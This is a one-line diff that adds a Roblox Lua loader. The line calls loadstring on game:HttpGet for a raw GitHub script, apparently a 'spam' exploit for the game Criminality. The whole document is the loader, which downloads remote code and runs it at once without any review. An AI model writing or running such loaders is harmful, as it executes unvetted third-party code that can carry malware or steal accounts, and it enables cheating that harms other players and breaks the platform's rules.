@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/criminality-spam5-l7o8c7l1hy2xsh.lua"))()
